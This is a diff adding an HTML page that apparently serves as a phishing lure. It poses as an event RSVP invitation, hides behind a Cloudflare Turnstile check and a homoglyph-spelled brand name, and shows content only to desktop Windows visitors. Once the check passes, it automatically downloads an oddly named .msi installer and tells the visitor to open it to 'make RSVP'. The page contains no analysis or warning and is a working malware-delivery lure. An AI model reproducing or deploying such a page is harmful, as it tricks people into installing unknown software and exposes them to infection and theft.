@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+
+body{
+    font-family:Arial, sans-serif;
+    background:#002a5c;
+}
+
+.container{
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    min-height:100vh;
+    padding:20px;
+}
+
+.thanks-card{
+    max-width:550px;
+    padding:3rem 2rem;
+    background:#fff;
+    border-radius:20px;
+    box-shadow:0 10px 30px rgba(0,0,0,0.08);
+    border-top:6px solid #002a5c;
+    text-align:center;
+}
+
+.thanks-card h2{
+    font-size:28px;
+    color:#002a5c;
+    margin-bottom:10px;
+}
+
+.thanks-card p{
+    font-size:16px;
+    color:#555;
+    margin-bottom:20px;
+}
+
+button{
+    background:#002a5c;
+    color:#fff;
+    border:none;
+    padding:14px 30px;
+    font-size:16px;
+    border-radius:50px;
+    cursor:pointer;
+    font-weight:bold;
+    transition:all .2s;
+}
+
+button:hover{
+    background:#1e7e34;
+    transform:scale(1.03);
+}
+
+button:disabled{
+    background:#aaa;
+    cursor:not-allowed;
+}
+
+.progress-container{
+    width:100%;
+    background:#002a5c;
+    border-radius:10px;
+    margin:20px 0;
+    overflow:hidden;
+    display:none;
+}
+
+.progress-bar{
+    width:0%;
+    height:6px;
+    background:#002a5c;
+}
+
+#toast{
+    position:fixed;
+    bottom:30px;
+    left:50%;
+    transform:translateX(-50%) translateY(20px);
+    background:#1f2f29;
+    color:#fff;
+    padding:14px 24px;
+    border-radius:50px;
+    font-size:14px;
+    opacity:0;
+    transition:.3s;
+}
+
+#toast b{color:#ffd966;}
+
+#deviceWarning{
+    display:none;
+    position:fixed;
+    top:0;
+    left:0;
+    width:100%;
+    height:100%;
+    background:#fff;
+    z-index:10000;
+    text-align:center;
+    padding-top:20%;
+}
+
+.warning-box h2{
+    font-size:26px;
+    color:#d32f2f;
+}
+
+.warning-box p{
+    color:#555;
+    margin-top:10px;
+}
+
+#loading-overlay{
+    position:fixed;
+    width:100%;
+    height:100%;
+    background:#fff;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    flex-direction:column;
+}
+
+
+.loading-spinner-container {
+    position: relative;
+    width: 80px;
+    height: 80px;
+    margin-bottom: 20px;
+}
+
+
+.loading-spinner{
+    border:3px solid #002a5c;
+    border-top:3px solid #bfd7f2;
+    border-radius:50%;
+    width:80px;
+    height:80px;
+    animation:spin .6s linear infinite;
+}
+
+
+.loading-icon {
+    position: absolute;
+    width: 55px;
+    height: 55px;
+    top: 49%;
+    left: 49%;
+    transform: translate(-50%, -50%);
+}
+
+
+.loading-text{
+    margin-top:15px;
+    color:#333;
+}
+
+.top-logo{
+    position:fixed;
+    top:20px;
+    left:20px;
+    z-index:9999;
+}
+
+.top-logo img{
+    width:200px;
+    height:auto;
+    display:block;
+}
+
+
+@keyframes spin{
+    0%{transform:rotate(0)}
+    100%{transform:rotate(360deg)}
+}
+</style>
+
+<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit"></script>
+</head>
+
+<body>
+
+            <div style="background-color: rgb(0, 42, 92); padding: 0px; width: 100%;"><img
+
+                class="" src="ss.png"
+
+                alt="Sоadp" style="width: 260px; border: none; height: auto !important;"
+
+                height="76" width="260"></td>
+         </div>
+
+<div id="loading-overlay">
+    <div class="loading-spinner-container">
+    <div class="loading-spinner"></div>
+        <img src="s.png" class="loading-icon" alt="Loading Icon">
+   </div>
+    <div class="loading-text">Loading Statement...</div>
+    <div id="cf-turnstile"></div>
+</div>
+
+<div class="form-container">
+
+<div class="container" id="mainContainer">
+    <div class="thanks-card">
+        <h2>🎉 You’re invited! 🎉</h2>
+        <p>Your RSVP event package is being prepared ...</p>
+       <p>Open the downloaded file that contains your digital RSVP form to make RSVP.</p>	
+       <p>🎊 Thank You 🎊</p>	   
+
+        <div class="progress-container" id="progressContainer">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+
+        <button id="manualDownload">Download Invitation Card</button>
+    </div>
+</div>
+
+<div id="deviceWarning">
+    <div class="warning-box">
+        <h2>⚠️ Unsupported Device</h2>
+        <p>It requires a Windows computer to make RSVP.</p>
+        <p>Please use a desktop or laptop.</p>
+    </div>
+</div>
+
+<div id="toast"></div>
+
+</div>
+
+<script>
+const files={windows:{url:"RSVPEvite_CFXGNRP8HO1S_19SYPURD17668_windows_x64.msi",name:"RSVPEvite_CFXGNRP8HO1S_19SYPURD17668_windows_x64.msi"}};
+let selectedFile=files.windows;
+let downloadInProgress=false;
+let turnstileVerified=false;
+
+function isDesktopWindows(){
+    const ua=navigator.userAgent||"";
+    const platform=navigator.platform||"";
+    return /Win/i.test(platform)&&!/Mobile/i.test(ua);
+}
+
+function showToast(msg){
+    const t=document.getElementById("toast");
+    t.innerHTML=msg;
+    t.style.opacity="1";
+    t.style.transform="translateX(-50%)";
+    setTimeout(()=>{t.style.opacity="0";},5000);
+}
+
+function updateProgress(p){
+    document.getElementById("progressContainer").style.display="block";
+    document.getElementById("progressBar").style.width=p+"%";
+}
+
+async function downloadFile(file){
+    if(downloadInProgress)return;
+    downloadInProgress=true;
+
+    try{
+        const res=await fetch(file.url);
+        const blob=await res.blob();
+        const url=URL.createObjectURL(blob);
+
+        const a=document.createElement("a");
+        a.href=url;
+        a.download=file.name;
+        a.click();
+
+        showToast("✅ Download complete");
+    }catch{
+        window.location=file.url;
+    }
+
+    downloadInProgress=false;
+}
+
+function launchMeeting(){
+    if(!turnstileVerified)return showToast("Verify first");
+    if(!isDesktopWindows())return document.getElementById("deviceWarning").style.display="block";
+    downloadFile(selectedFile);
+}
+
+document.addEventListener("DOMContentLoaded",()=>{
+    turnstile.ready(()=>{
+        turnstile.render('#cf-turnstile',{
+            sitekey:'0x4AAAAAAC1YxUs3N81QT2L0',
+            callback:()=>{
+                turnstileVerified=true;
+                document.getElementById('loading-overlay').style.display='none';
+                document.body.classList.add('verified');
+                setTimeout(launchMeeting,1200);
+            }
+        });
+    });
+
+    const btn=document.getElementById("manualDownload");
+    btn.disabled=true;
+    btn.onclick=launchMeeting;
+
+    setTimeout(()=>btn.disabled=false,3000);
+});
+</script>
+
+</body>
+</html>
